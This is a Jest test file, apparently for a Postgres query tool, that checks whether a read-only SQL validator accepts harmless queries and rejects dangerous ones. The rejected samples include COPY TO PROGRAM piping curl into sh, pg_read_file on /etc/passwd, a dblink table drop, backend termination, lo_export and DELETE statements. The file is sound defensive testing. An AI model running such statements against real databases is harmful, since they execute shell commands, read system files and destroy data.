import { readOnlyStatementProblem } from './readOnlyStatement';

describe('as consultas do postgres_query', () => {
  it.each([
    'SELECT * FROM utilizadores',
    'with x as (select 1) select * from x',
    'EXPLAIN SELECT 1',
    'SHOW server_version',
    "SELECT 'pg_terminate_backend(1)' AS texto",
    'select count(*) from t; ',
  ])('aceita %s', (sql) => {
    expect(readOnlyStatementProblem(sql)).toBeNull();
  });

  it.each([
    "COPY (SELECT 1) TO PROGRAM 'curl x | sh'",
    "SELECT 1; COPY t TO PROGRAM 'sh'",
    'SELECT pg_terminate_backend(123)',
    "select dblink_exec('dbname=x', 'drop table t')",
    "SELECT pg_read_file('/etc/passwd')",
    'EXPLAIN ANALYZE DELETE FROM t',
    'DELETE FROM t',
    'select lo_export(1, $$/tmp/x$$)',
  ])('recusa %s', (sql) => {
    expect(readOnlyStatementProblem(sql)).not.toBeNull();
  });
});
